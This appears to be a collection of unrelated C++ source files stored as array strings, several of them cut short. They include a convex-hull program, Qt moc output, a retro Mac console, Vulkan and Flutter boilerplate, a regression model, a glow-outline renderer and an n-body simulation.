    "#include <iostream>\n#include <vector>\n#include <algorithm>\n#include <stack>\n#include <cmath>\n#include <climits> // Include the <climits> header for integer limits\n\nstruct Point {\n    double x, y;\n};\n\n// Function to calculate the polar angle of a point with respect to the pivot\ndouble polarAngle(const Point& p, const Point& pivot) {\n    double dx = p.x - pivot.x;\n    double dy = p.y - pivot.y;\n    return atan2(dy, dx);\n}\n\n// Function to check if three points make a counterclockwise turn (left turn)\nint orientation(const Point& p, const Point& q, const Point& r) {\n    double val = (q.y - p.y) * (r.x - q.x) - (q.x - p.x) * (r.y - q.y);\n    if (val == 0) return 0;      // Collinear\n    return (val > 0) ? 1 : 2;  // Clockwise or Counterclockwise\n}\n\n// Graham Scan algorithm to find the convex hull\nstd::vector<Point> grahamScan(std::vector<Point>& points) {\n    // Find the bottommost point\n    Point pivot = points[0];\n    int pivotIdx = 0;\n\n    for (int i = 1; i < points.size(); i++) {\n        if (points[i].y < pivot.y || (points[i].y == pivot.y && points[i].x < pivot.x)) {\n            pivot = points[i];\n            pivotIdx = i;\n        }\n    }\n\n    // Sort the points by polar angle with respect to the pivot\n    std::sort(points.begin(), points.end(), [&](const Point& p1, const Point& p2) {\n        double angle1 = polarAngle(p1, pivot);\n        double angle2 = polarAngle(p2, pivot);\n        if (angle1 != angle2) return angle1 < angle2;\n        return (p1.x < p2.x) || (p1.x == p2.x && p1.y < p2.y);\n    });\n\n    // Initialize the convex hull with the first three points\n    std::vector<Point> convexHull;\n    convexHull.push_back(points[0]);\n    convexHull.push_back(points[1]);\n    convexHull.push_back(points[2]);\n\n    // Process the rest of the points\n    for (int i = 3; i < points.size(); i++) {\n        while (convexHull.size() > 1 && orientation(convexHull[convexHull.size() - 2], convexHull.back(), points[i]) != 2) {\n            convexHull.pop_back();\n        }\n        convexHull.push_back(points[i]);\n    }\n\n    return convexHull;\n}\n\nvoid printContainerPositions(const std::vector<Point>& points) {\n    std::cout << \"Container Positions:\" << std::endl;\n    for (const Point& p : points) {\n        std::cout << \"(\" << p.x << \", \" << p.y << \")\" << std::endl;\n    }\n}\n\nvoid printConvexHull(const std::vector<Point>& convexHull) {\n    std::cout << \"Convex Hull Points:\" << std::endl;\n    for (const Point& p : convexHull) {\n        std::cout << \"(\" << p.x << \", \" << p.y << \")\" << std::endl;\n    }\n}\n\nvoid visualizeContainerPlacement(const std::vector<Point>& points, const std::vector<Point>& convexHull) {\n    // Create an ASCII art representation of the container placement\n    const char containerChar = 'C';\n    const char hullChar = '*';\n    const char emptyChar = '.';\n    \n    // Determine the dimensions of the visualization grid\n    int minX = INT_MAX;\n    int minY = INT_MAX;\n    int maxX = INT_MIN;\n    int maxY = INT_MIN;\n\n    for (const Point& p : points) {\n        minX = std::min(minX, static_cast<int>(p.x));\n        minY = std::min(minY, static_cast<int>(p.y));\n        maxX = std::max(maxX, static_cast<int>(p.x));\n        maxY = std::max(maxY, static_cast<int>(p.y));\n    }\n\n    // Create a 2D grid for visualization\n    std::vector<std::vector<char>> grid(maxY - minY + 1, std::vector<char>(maxX - minX + 1, emptyChar));\n\n    // Mark container positions\n    for (const Point& p : points) {\n        grid[p.y - minY][p.x - minX] = containerChar;\n    }\n\n    // Mark convex hull\n    for (const Point& p : convexHull) {\n        grid[p.y - minY][p.x - minX] = hullChar;\n    }\n\n    // Print the visualization grid\n    for (int i = 0; i < grid.size(); i++) {\n        for (int j = 0; j < grid[i].size(); j++) {\n            std::cout << grid[i][j];\n        }\n        std::cout << std::endl;\n    }\n}\n\nint main() {\n    std::vector<Point> containerPositions;\n    int numContainers;\n\n    std::cout << \"Enter the number of containers: \";\n    std::cin >> numContainers;\n\n    std::cout << \"Enter the container positions (x y):\" << std::endl;\n    for (int i = 0; i < numContainers; i++) {\n        Point p;\n        std::cin >> p.x >> p.y;\n        containerPositions.push_back(p);\n    }\n\n    std::vector<Point> convexHull = grahamScan(containerPositions);\n\n    printContainerPositions(containerPositions);\n    printConvexHull(convexHull);\n\n    visualizeContainerPlacement(containerPositions, convexHull);\n\n    return 0;\n}",
    "/****************************************************************************\n** Meta object code from reading C++ file 'Titlebar.h'\n**\n** Created by: The Qt Meta Object Compiler version 67 (Qt 5.15.2)\n**\n** WARNING! All changes made in this file will be lost!\n*****************************************************************************/\n\n#include <memory>\n#include \"../../Titlebar.h\"\n#include <QtCore/qbytearray.h>\n#include <QtCore/qmetatype.h>\n#if !defined(Q_MOC_OUTPUT_REVISION)\n#error \"The header file 'Titlebar.h' doesn't include <QObject>.\"\n#elif Q_MOC_OUTPUT_REVISION != 67\n#error \"This file was generated using the moc from 5.15.2. It\"\n#error \"cannot be used with the include files from this version of Qt.\"\n#error \"(The moc has changed too much.)\"\n#endif\n\nQT_BEGIN_MOC_NAMESPACE\nQT_WARNING_PUSH\nQT_WARNING_DISABLE_DEPRECATED\nstruct qt_meta_stringdata_TitleBar_t {\n    QByteArrayData data[10];\n    char stringdata0[131];\n};\n#define QT_MOC_LITERAL(idx, ofs, len) \\\n    Q_STATIC_BYTE_ARRAY_DATA_HEADER_INITIALIZER_WITH_OFFSET(len, \\\n    qptrdiff(offsetof(qt_meta_stringdata_TitleBar_t, stringdata0) + ofs \\\n        - idx * sizeof(QByteArrayData)) \\\n    )\nstatic const qt_meta_stringdata_TitleBar_t qt_meta_stringdata_TitleBar = {\n    {\nQT_MOC_LITERAL(0, 0, 8), // \"TitleBar\"\nQT_MOC_LITERAL(1, 9, 11), // \"iconClicked\"\nQT_MOC_LITERAL(2, 21, 0), // \"\"\nQT_MOC_LITERAL(3, 22, 20), // \"topmostButtonClicked\"\nQT_MOC_LITERAL(4, 43, 9), // \"isTopmost\"\nQT_MOC_LITERAL(5, 53, 18), // \"closeButtonClicked\"\nQT_MOC_LITERAL(6, 72, 8), // \"setTitle\"\nQT_MOC_LITERAL(7, 81, 5), // \"title\"\nQT_MOC_LITERAL(8, 87, 22), // \"onTopmostButtonClicked\"\nQT_MOC_LITERAL(9, 110, 20) // \"onCloseButtonClicked\"\n\n    },\n    \"TitleBar\\0iconClicked\\0\\0topmostButtonClicked\\0\"\n    \"isTopmost\\0closeButtonClicked\\0setTitle\\0\"\n    \"title\\0onTopmostButtonClicked\\0\"\n    \"onCloseButtonClicked\"\n};\n#undef QT_MOC_LITERAL\n\nstatic const uint qt_meta_data_TitleBar[] = {\n\n // content:\n       8,       // revision\n       0,       // classname\n       0,    0, // classinfo\n       6,   14, // methods\n       0,    0, // properties\n       0,    0, // enums/sets\n       0,    0, // constructors\n       0,       // flags\n       3,       // signalCount\n\n // signals: name, argc, parameters, tag, flags\n       1,    0,   44,    2, 0x06 /* Public */,\n       3,    1,   45,    2, 0x06 /* Public */,\n       5,    0,   48,    2, 0x06 /* Public */,\n\n // slots: name, argc, parameters, tag, flags\n       6,    1,   49,    2, 0x0a /* Public */,\n       8,    0,   52,    2, 0x08 /* Private */,\n       9,    0,   53,    2, 0x08 /* Private */,\n\n // signals: parameters\n    QMetaType::Void,\n    QMetaType::Void, QMetaType::Bool,    4,\n    QMetaType::Void,\n\n // slots: parameters\n    QMetaType::Void, QMetaType::QString,    7,\n    QMetaType::Void,\n    QMetaType::Void,\n\n       0        // eod\n};\n\nvoid TitleBar::qt_static_metacall(QObject *_o, QMetaObject::Call _c, int _id, void **_a)\n{\n    if (_c == QMetaObject::InvokeMetaMethod) {\n        auto *_t = static_cast<TitleBar *>(_o);\n        Q_UNUSED(_t)\n        switch (_id) {\n        case 0: _t->iconClicked(); break;\n        case 1: _t->topmostButtonClicked((*reinterpret_cast< bool(*)>(_a[1]))); break;\n        case 2: _t->closeButtonClicked(); break;\n        case 3: _t->setTitle((*reinterpret_cast< const QString(*)>(_a[1]))); break;\n        case 4: _t->onTopmostButtonClicked(); break;\n        case 5: _t->onCloseButtonClicked(); break;\n        default: ;\n        }\n    } else if (_c == QMetaObject::IndexOfMethod) {\n        int *result = reinterpret_cast<int *>(_a[0]);\n        {\n            using _t = void (TitleBar::*)();\n            if (*reinterpret_cast<_t *>(_a[1]) == static_cast<_t>(&TitleBar::iconClicked)) {\n                *result = 0;\n                return;\n            }\n        }\n        {\n            using _t = void (TitleBar::*)(bool );\n            if (*reinterpret_cast<_t *>(_a[1]) == static_cast<_t>(&TitleBar::topmostButtonClicked)) {\n                *result = 1;\n                return;\n            }\n        }\n        {\n            using _t = void (TitleBar::*)();\n            if (*reinterpret_cast<_t *>(_a[1]) == static_cast<_t>(&TitleBar::closeButtonClicked)) {\n                *result = 2;\n                return;\n            }\n        }\n    }\n}\n\nQT_INIT_METAOBJECT const QMetaObject TitleBar::staticMetaObject = { {\n    QMetaObject::SuperData::link<QWidget::staticMetaObject>(),\n    qt_meta_stringdata_TitleBar.data,\n    qt_meta_data_TitleBar,\n    qt_static_metacall,\n    nullptr,\n    nullptr\n} };\n\n\nconst QMetaObject *TitleBar::metaObject() const\n{\n    return QObject::d_ptr->metaObject ? QObject::d_ptr->dynamicMetaObject() : &staticMetaObject;\n}\n\nvoid *TitleBar::qt_metacast(const char *_clname)\n{\n    if (!_clname) return nullptr;\n    if (!strcmp(_clname, qt_meta_stringdata_TitleBar.stringdata0))\n        return static_cast<void*>(this);\n    return QWidget::qt_metacast(_clname);\n}\n\nint TitleBar::qt_metacall(QMetaObject::Call _c, int _id, void **_a)\n{\n    _id = QW",
    "/*\n    Copyright 2012-2020 Wolfgang Thaller, Davide Bucci\n\n    This file is part of Retro68.\n\n    Retro68 is free software: you can redistribute it and/or modify\n    it under the terms of the GNU General Public License as published by\n    the Free Software Foundation, either version 3 of the License, or\n    (at your option) any later version.\n\n    Retro68 is distributed in the hope that it will be useful,\n    but WITHOUT ANY WARRANTY; without even the implied warranty of\n    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n    GNU General Public License for more details.\n\n    Under Section 7 of GPL version 3, you are granted additional\n    permissions described in the GCC Runtime Library Exception, version\n    3.1, as published by the Free Software Foundation.\n\n    You should have received a copy of the GNU General Public License\n    along with Retro68.  If not, see <http://www.gnu.org/licenses/>.\n*/\n\n#include \"Console.hpp\"\n#include \"MacUtils.h\"\n#include \"Fonts.h\"\n#include \"Processes.h\"\n\n#include <algorithm>\n\nusing namespace retro;\n\nconst char BEL = 7;\nconst char MAX_LEN = 250;\n\nConsole *Console::currentInstance = NULL;\n\nAttributes::Attributes(void)\n{\n    reset();\n}\nvoid Attributes::reset(void)\n{\n    cBold = false;\n    cUnderline = false;\n    cItalic = false;\n}\n\nbool Attributes::isBold(void) const\n{\n    return cBold;\n}\n\nbool Attributes::isUnderline(void) const\n{\n    return cUnderline;\n}\n\nbool Attributes::isItalic(void) const\n{\n    return cItalic;\n}\n\nvoid Attributes::setBold(const bool v)\n{\n    cBold = v;\n}\n\nvoid Attributes::setItalic(const bool v)\n{\n    cItalic = v;\n}\n\nvoid Attributes::setUnderline(const bool v)\n{\n    cUnderline = v;\n}\n\ninline bool operator==(const Attributes &lhs, const Attributes &rhs)\n{\n    return lhs.isBold() == rhs.isBold() && lhs.isUnderline() == rhs.isUnderline() && lhs.isItalic() == rhs.isItalic();\n}\n\ninline bool operator!=(const Attributes &lhs, const Attributes &rhs)\n{\n    return !(lhs == rhs);\n}\n\ninline bool operator==(const AttributedChar &lhs, const AttributedChar &rhs)\n{\n    return lhs.c == rhs.c && lhs.attrs == rhs.attrs;\n}\n\ninline bool operator!=(const AttributedChar &lhs, const AttributedChar &rhs)\n{\n    return !(lhs == rhs);\n}\n\nnamespace\n{\n    class FontSetup\n    {\n        short saveFont, saveSize, saveFace;\n\n    public:\n        FontSetup()\n        {\n#if TARGET_API_MAC_CARBON\n            GrafPtr port;\n            GetPort(&port);\n            saveFont = GetPortTextFont(port);\n            saveSize = GetPortTextSize(port);\n#else\n            saveFont = qd.thePort->txFont;\n            saveSize = qd.thePort->txSize;\n            saveFace = qd.thePort->txFace;\n#endif\n            TextFont(kFontIDMonaco);\n            TextSize(9);\n            TextFace(normal);\n        }\n\n        ~FontSetup()\n        {\n            TextFont(saveFont);\n            TextSize(saveSize);\n            TextFace(saveFace);\n        }\n    };\n}\n\nConsole::Console()\n{\n}\n\nConsole::Console(GrafPtr port, Rect r)\n{\n    Init(port, r);\n}\n\nConsole::~Console()\n{\n    if (currentInstance == this)\n        currentInstance = NULL;\n}\n\nvoid Console::Init(GrafPtr port, Rect r)\n{\n    consolePort = port;\n    bounds = r;\n\n    PortSetter setport(consolePort);\n    FontSetup fontSetup;\n\n    InsetRect(&bounds, 2, 2);\n\n    cellSizeY = 12;\n    cellSizeX = CharWidth('M');\n\n    rows = (bounds.bottom - bounds.top) / cellSizeY;\n    cols = (bounds.right - bounds.left) / cellSizeX;\n\n    chars = std::vector<AttributedChar>(rows * cols, AttributedChar(' ', currentAttr));\n\n    onscreen = chars;\n\n    cursorX = cursorY = 0;\n    sequenceState = State::noSequence;\n}\n\nvoid Console::SetAttributes(Attributes aa)\n{\n    TextFace(aa.isBold() ? bold + condense : 0 + aa.isUnderline() ? underline\n                                         : 0 + aa.isItalic()      ? italic\n                                                                  : 0);\n}\n\nRect Console::CellRect(short x, short y)\n{\n    return {(short)(bounds.top + y * cellSizeY), (short)(bounds.left + x * cellSizeX),\n            (short)(bounds.top + (y + 1) * cellSizeY), (short)(bounds.left + (x + 1) * cellSizeX)};\n}\nvoid Console::DrawCell(short x, short y, bool erase)\n{\n    Rect r = CellRect(x, y);\n\n    if (cursorDrawn)\n    {\n        if (y == cursorY && x == cursorX)\n        {\n            erase = true;\n            cursorDrawn = false;\n        }\n    }\n\n    if (erase)\n        EraseRect(&r);\n    MoveTo(r.left, r.bottom - 2);\n    DrawChar(chars[y * cols + x].c);\n}\n\nvoid Console::DrawCells(short x1, short x2, short y, bool erase)\n{\n    Rect r = {(short)(bounds.top + y * cellSizeY), (short)(bounds.left + x1 * cellSizeX),\n              (short)(bounds.top + (y + 1) * cellSizeY), (short)(bounds.left + x2 * cellSizeX)};\n    if (cursorDrawn)\n    {\n        if (y == cursorY && x1 <= cursorX && x2 > cursorX)\n        {\n            erase = true;\n            cursorDrawn = false;\n        }\n    }\n\n    if (erase)\n        EraseRect(&r);\n    MoveTo(r.left, r.bottom - 2);\n\n    Attributes a = chars[y * cols + x1].attrs",
    "#include \"engine.h\"\n#include <iostream>\n#include \"instance.h\"\n\nEngine::Engine() {\n\n    if (debugMode) {\n        std::cout << \"Produzindo a engine\\n\";\n    }\n  \n    build_glfw_window();\n    \n    make_instance();\n\n}\n\nvoid Engine::build_glfw_window() {\n\n     //inicializa glfw\n     glfwInit();\n     \n     //por enquanto sem rendering client - ser\u00e1 Vulkan\n     glfwWindowHint(GLFW_CLIENT_API, GLFW_NO_API);\n     //resizing breaks the swapchain, we'll disable it for now\n     glfwWindowHint(GLFW_RESIZABLE, GLFW_FALSE);\n     \n     //GLFWwindow* glfwCreateWindow (int width, int height, const char *title, GLFWmonitor *monitor, GLFWwindow *share)\n \n     if (window = glfwCreateWindow(width, height, \"Engine teste\", nullptr, nullptr)) {\n        if (debugMode) {\n            std::cout << \"Aqui est\u00e1 a window da engine, width\" << width << \", height\" << height << '\\n';\n      }\n      else {\n              if (debugMode) {\n                      std::cout << \"A cria\u00e7\u00e3o da window falhou\\n\";\n              }\n         }\n      \n     }\n     \n     }\n     \nvoid Engine::make_instance() {\n\n    instance = vkInit::make_instance(debugMode, \"Engine teste\");\n}      \n     \n     Engine::~Engine() {\n       \n            if (debugMode) {\n                    std::cout << \"At\u00e9 mais!\\n\";\n            }\n       \n            //terminate glfw\n            glfwTerminate();\n       \n       \n     }    \n     \n     \n\n",
    "#include <cstdio>\n#include <cstdlib>\n#include <regresion.h>\n#include <iostream>\n\ntemplate<int N>\nRegressionModel<N>::RegressionModel (void) {\n        init_weights();\n};\n\ntemplate<int N>\nvoid RegressionModel<N>::init_weights (void) {\n    for (int i=0; i < N; ++i) {\n        W_[i] = static_cast<float>(rand()) / RAND_MAX;\n    }\n    B_ = static_cast<float>(rand()) / RAND_MAX;\n};\n\ntemplate<int N>\nvoid RegressionModel<N>::grad_step (float&& alpha, float**base, float* y, float** x) {\n    for (int j = 0; j < N; ++j) {\n        W_[j] -= alpha*dJ_dwn(j, base, y, x);\n    }\n    B_ -= alpha* dJ_db(base, y);\n};\n\ntemplate<int N>\nfloat RegressionModel<N>::dJ_dwn (unsigned int n, float** base, float* y, float** x) const {\n    float out = 0;\n    float* out_array = new float[length(base)]{0};\n\n    #pragma unroll\n    for (int i = 0; i < length(base); ++i) {\n        #pragma unroll\n        for (int j = 0; j < N; ++j) {\n            out_array[i] += base[i][j];\n        }\n        out_array[i] += B_ - y[i];\n        out_array[i] *= x[i][n];\n    }\n\n    for (auto value: out_array) {\n        out += value;\n    }\n\n    return 0.5 * out/length(out_array);\n};\n\ntemplate<int N>\nfloat** RegressionModel<N>::dJ_db (float** base, float* y) const {\n    float* out_array = new float[length(base)]{0};\n    float out = 0;\n    #pragma unroll\n    for (int i = 0; i < length(base); ++i) {\n        #pragma unroll\n        for (int j = 0; j < N; ++j) {\n            out_array[i] += base[i][j];\n        }\n        out_array[i] += B_ - y[i];\n    }\n\n    #pragma unroll\n    for (auto value: out_array) {\n        out += value;\n    }\n    delete[] out_array;\n\n    return 0.5 * out/length(out_array);\n}\n\ntemplate<int N>\nfloat** RegressionModel<N>::base_dJ (float x[][N]) const {\n    // x*w + b\n    float** out = new float*[length(x)];\n    #pragma unroll\n    for (int j = 0; j < length(x); ++j) {\n        out[j] = new float[N];\n        #pragma unroll\n        for (int i = 0; i < length(x[j]); ++i) {\n            out[j][i] = x[j][i] * W_[i];\n        }\n    }\n    return out;\n};\n\ntemplate<int N>\nfloat RegressionModel<N>::compute_loss (float** base, float* y) const {\n    float out_array[length(base)] = {0};\n    float out = 0;\n    #pragma unroll\n    for (int i = 0; i < length(base); ++i) {\n        #pragma unroll\n        for (int j = 0; j < N; ++j) {\n            out_array[i] += base[i][j];\n        }\n        out_array[i] += B_ - y[i];\n    }\n\n    for (int k=0; k< length(out_array); ++k) {\n        out += std::pow(out_array[k], 2);\n    }\n    delete [] out_array;\n\n    return out/length(out_array);\n}\n\ntemplate <int N>\nvoid RegressionModel<N>::fit (unsigned int&& epochs, float&& lr, float** x, float* y) {\n    for (int epoch = 0; epoch < epochs; ++epoch) {\n        float** base = base_dJ(x);\n        grad_step(lr, base, y, x);\n        float loss = compute_loss(base, y);\n\n        std::cout << \"Epoch:\" << epoch << \", Loss:\" << loss << std::endl;\n\n        for (int i; i < length(x) ; ++i) {\n            delete[] base[i];\n        }\n        delete[] base;\n    }\n};\n\n",
    "#include \"outlines.h\"\n#include \"../models/models.h\"\n\nbool c_outlines::is_rendering( ) {\n\treturn m_rendering;\n}\n\nbool c_outlines::is_used_material( i_material* material ) {\n\treturn material == m_material_glow_color;\n}\n\nbool c_outlines::is_entity_rendered( c_base_entity* entity ) {\n\tif ( !entity || entity->is_dormant( ) )\n\t\treturn false;\n\n\treturn m_rendered_entities.find( entity ) != m_rendered_entities.end( );\n}\n\nvoid c_outlines::init_materials( ) {\n\tif ( !m_material_glow_color ) {\n\t\tm_material_glow_color = ctx->m_material_system->find_material( ( \"dev/glow_color\" ), \"Other textures\" );\n\t\tm_material_glow_color->increment_reference_count( );\n\t}\n\n\tif ( !m_rt_full_frame ) {\n\t\tm_rt_full_frame = ctx->m_material_system->find_texture( ( \"_rt_FullFrameFB\" ), \"RenderTargets\" );\n\t\tm_rt_full_frame->increment_reference_count( );\n\t}\n\n\tif ( !m_render_buffer1 ) {\n\t\tm_render_buffer1 = ctx->m_material_system->create_named_render_target_texture_ex(\n\t\t\t( \"glow_buffer_1\" ), m_rt_full_frame->get_actual_width( ), m_rt_full_frame->get_actual_height( ),\n\t\t\tRT_SIZE_LITERAL, IMAGE_FORMAT_RGB888, MATERIAL_RT_DEPTH_SHARED,\n\t\t\tTEXTUREFLAGS_CLAMPS | TEXTUREFLAGS_CLAMPT | TEXTUREFLAGS_EIGHTBITALPHA, CREATERENDERTARGETFLAGS_HDR );\n\t\tm_render_buffer1->increment_reference_count( );\n\t}\n\n\tif ( !m_render_buffer2 ) {\n\t\tm_render_buffer2 = ctx->m_material_system->create_named_render_target_texture_ex(\n\t\t\t( \"glow_buffer_2\" ), m_rt_full_frame->get_actual_width( ), m_rt_full_frame->get_actual_height( ),\n\t\t\tRT_SIZE_LITERAL, IMAGE_FORMAT_RGB888, MATERIAL_RT_DEPTH_SHARED,\n\t\t\tTEXTUREFLAGS_CLAMPS | TEXTUREFLAGS_CLAMPT | TEXTUREFLAGS_EIGHTBITALPHA, CREATERENDERTARGETFLAGS_HDR );\n\t\tm_render_buffer2->increment_reference_count( );\n\t}\n\n\tif ( !m_material_blur_x ) {\n\t\tif ( !m_material_blur_x_vmt ) {\n\t\t\tm_material_blur_x_vmt = new key_values( \"BlurFilterX\" );\n\t\t\tm_material_blur_x_vmt->set_string( \"$basetexture\", \"glow_buffer_1\" );\n\t\t\tm_material_blur_x_vmt->set_string( \"$wireframe\", \"0\" );\n\t\t}\n\t\tm_material_blur_x = ctx->m_material_system->create_material( \"m_pMatBlurX\", m_material_blur_x_vmt );\n\t}\n\n\tif ( !m_material_blur_x_wireframe ) {\n\t\tif ( !m_material_blur_x_wireframe_vmt ) {\n\t\t\tm_material_blur_x_wireframe_vmt = new key_values( \"BlurFilterX\" );\n\t\t\tm_material_blur_x_wireframe_vmt->set_string( \"$basetexture\", \"glow_buffer_1\" );\n\t\t\tm_material_blur_x_wireframe_vmt->set_string( \"$wireframe\", \"1\" );\n\t\t}\n\t\tm_material_blur_x_wireframe = ctx->m_material_system->create_material( \"m_pMatBlurXwf\", m_material_blur_x_wireframe_vmt );\n\t}\n\n\tif ( !m_material_blur_y ) {\n\t\tif ( !m_material_blur_y_vmt ) {\n\t\t\tm_material_blur_y_vmt = new key_values( \"BlurFilterY\" );\n\t\t\tm_material_blur_y_vmt->set_string( \"$basetexture\", \"glow_buffer_2\" );\n\t\t\tm_material_blur_y_vmt->set_string( \"$wireframe\", \"0\" );\n\t\t}\n\t\tm_material_blur_y = ctx->m_material_system->create_material( \"m_pMatBlurY\", m_material_blur_y_vmt );\n\t}\n\n\tif ( !m_material_blur_y_wireframe ) {\n\t\tif ( !m_material_blur_y_wireframe_vmt ) {\n\t\t\tm_material_blur_y_wireframe_vmt = new key_values( \"BlurFilterY\" );\n\t\t\tm_material_blur_y_wireframe_vmt->set_string( \"$basetexture\", \"glow_buffer_2\" );\n\t\t\tm_material_blur_y_wireframe_vmt->set_string( \"$wireframe\", \"1\" );\n\t\t}\n\t\tm_material_blur_y_wireframe = ctx->m_material_system->create_material( \"m_pMatBlurYwf\", m_material_blur_y_wireframe_vmt );\n\t}\n\n\tif ( !m_material_halo ) {\n\t\tif ( !m_material_halo_vmt ) {\n\t\t\tm_material_halo_vmt = new key_values( \"UnlitGeneric\" );\n\t\t\tm_material_halo_vmt->set_string( \"$basetexture\", \"glow_buffer_1\" );\n\t\t\tm_material_halo_vmt->set_string( \"$wireframe\", \"0\" );\n\t\t\tm_material_halo_vmt->set_string( \"$additive\", \"1\" );\n\t\t}\n\t\tm_material_halo = ctx->m_material_system->create_material( \"m_pMatHaloAddToScreen\", m_material_halo_vmt );\n\t}\n}\n\nvoid c_outlines::remove_materials( ) {\n\tif ( m_material_glow_color ) {\n\t\tm_material_glow_color->decrement_reference_count( );\n\t\t//m_material_glow_color->delete_if_unreferenced( );\n\t\tm_material_glow_color = nullptr;\n\t}\n\n\tif ( m_rt_full_frame ) {\n\t\tm_rt_full_frame->decrement_reference_count( );\n\t\t//m_rt_full_frame->delete_if_unreferenced( );\n\t\tm_rt_full_frame = nullptr;\n\t}\n\n\tif ( m_render_buffer1 ) {\n\t\tm_render_buffer1->decrement_reference_count( );\n\t\t//m_render_buffer1->delete_if_unreferenced( );\n\t\tm_render_buffer1 = nullptr;\n\t}\n\n\tif ( m_render_buffer2 ) {\n\t\tm_render_buffer2->decrement_reference_count( );\n\t\t//m_render_buffer2->delete_if_unreferenced( );\n\t\tm_render_buffer2 = nullptr;\n\t}\n\n\tif ( m_material_blur_x ) {\n\t\tm_material_blur_x->decrement_reference_count( );\n\t\t//m_material_blur_x->delete_if_unreferenced( );\n\t\tm_material_blur_x = nullptr;\n\t\tm_material_blur_x_vmt = nullptr;\n\t}\n\n\tif ( m_material_blur_x_wireframe ) {\n\t\tm_material_blur_x_wireframe->decrement_reference_count( );\n\t\t//m_material_blur_x_wireframe->delete_if_unreferenced( );\n\t\tm_material_blur_x_wireframe = nullptr;\n\t\tm_material_blur_x_wireframe_vmt = nullptr;\n\t}\n\n\tif ( m_material_blur_y ) {\n\t\tm_material_blur_y->decrement_reference_count( );\n\t\t//m_material_blur_y->delete_if_unre",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"mycv_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"efoodlocalserver\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\r\n#include <string>\r\n#include <math.h>\r\n\r\n/*\r\nhttps://chatgpt.com/c/980c093b-84ca-4335-b7d0-bd6ad957c450\r\ninteresting fixes, be sure to review later.\r\n*/\r\n\r\nclass DoublelyLinkedListNode {\r\n        DoublelyLinkedListNode *leftptr = nullptr, *rightptr = nullptr; // left\r\n    public:\r\n        void setLeftPtr (DoublelyLinkedListNode*);\r\n        void setRightPtr (DoublelyLinkedListNode*);\r\n        DoublelyLinkedListNode* getLeftPtr () {return leftptr;};\r\n        DoublelyLinkedListNode* getRightPtr () {return rightptr;};    \r\n};\r\n\r\nvoid DoublelyLinkedListNode::setLeftPtr (DoublelyLinkedListNode *inputPtr) {\r\n    leftptr = inputPtr;\r\n}\r\n\r\nvoid DoublelyLinkedListNode::setRightPtr (DoublelyLinkedListNode *inputPtr) {\r\n    rightptr = inputPtr;\r\n}\r\n\r\nclass PointMass : public DoublelyLinkedListNode{\r\n        double x, y, vx, vy, nextX, nextY, nextVX, nextVY;\r\n    public:\r\n        void setValues (double, double, double, double);\r\n        void setLeftPtr (PointMass*);\r\n        void setRightPtr (PointMass*);        \r\n        double getXValue () {return x;};\r\n        double getYValue () {return y;};\r\n        double getVXValue () {return vx;};\r\n        double getVYValue () {return vy;};\r\n        PointMass* getLeftPtr () {return (PointMass*) DoublelyLinkedListNode::getLeftPtr();}; //can cast data for doublylinkedlist pointer into a pointmass pointer\r\n        PointMass* getRightPtr () {return (PointMass*) DoublelyLinkedListNode::getRightPtr();}; \r\n};\r\n\r\nvoid PointMass::setLeftPtr (PointMass *inputPtr) {\r\n    DoublelyLinkedListNode::setLeftPtr(inputPtr);\r\n}\r\n\r\nvoid PointMass::setRightPtr (PointMass *inputPtr) {\r\n    DoublelyLinkedListNode::setRightPtr(inputPtr);\r\n}\r\n\r\nvoid PointMass::setValues (double xin, double yin, double vxin, double vyin) {\r\n    x = xin;\r\n    y = yin;\r\n    vx = vxin;\r\n    vy = vyin;\r\n}\r\n\r\n\r\n/*\r\nn bodies\r\nfor each body, this equation must be summed for every other body F=GMm/r^2\r\n*/\r\n\r\ndouble calculateForceX(PointMass *nodePtr, PointMass *topTrav){\r\n    return (nodePtr->getXValue()-topTrav->getXValue())/pow(pow((nodePtr->getXValue()-topTrav->getXValue()), 2) + pow((nodePtr->getYValue()-topTrav->getYValue()), 2), 2);\r\n}\r\n\r\ndouble 